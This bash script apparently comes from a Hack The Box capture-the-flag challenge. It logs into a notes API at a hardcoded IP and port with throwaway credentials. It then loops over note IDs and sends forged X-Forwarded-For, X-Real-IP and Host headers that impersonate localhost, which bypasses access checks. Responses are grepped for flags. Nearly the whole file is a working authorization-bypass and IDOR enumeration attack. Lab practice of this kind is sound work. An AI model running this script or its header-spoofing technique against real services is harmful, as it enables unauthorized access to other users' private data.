#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
API_PORT=${2:-41412}
TO=${3:-6}
OUT_DIR=/workspace/recon/httpx
TMP_DIR=/workspace/recon/tmp
API_BASE="http://$IP:$API_PORT"
mkdir -p "$OUT_DIR" "$TMP_DIR"
# Fresh token
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' \
  -d '{"email":"a@a.com","password":"a"}' \
  "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
TOKEN=$(jq -r .token "$OUT_DIR/login_resp.json")
# Baseline list
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" \
  "$API_BASE/api/notes" > "$OUT_DIR/notes_list.json" || true
# Brute IDs with localhost-forged headers
: > "$OUT_DIR/notes_hits.txt"
MAX_ID=${4:-120}
for id in $(seq 1 "$MAX_ID"); do
  URL_NOTE="$API_BASE/api/notes/$id"
  URL_CHECK="$API_BASE/api/notes/$id/check-permission"
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" \
    -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Host: localhost' \
    "$URL_NOTE" 2>/dev/null || true)
  printf '%s' "$RES" > "$OUT_DIR/note_${id}.json"
  printf '%s' "$RES" | rg -n "HTB\{[^}]+\}" -S >> "$OUT_DIR/notes_hits.txt" || true
  RES2=$(curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" \
    -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Host: localhost' \
    "$URL_CHECK" 2>/dev/null || true)
  printf '%s' "$RES2" > "$OUT_DIR/note_${id}_check.json"
  printf '%s' "$RES2" | rg -n "HTB\{[^}]+\}" -S >> "$OUT_DIR/notes_hits.txt" || true
  sleep 0.05
done
# Also try /api/notes/all with forged headers
curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" \
  -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Host: localhost' \
  "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_try.json" || true
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/notes_all_hits.txt" || true
sed -n '1,120p' "$OUT_DIR/notes_hits.txt" || true
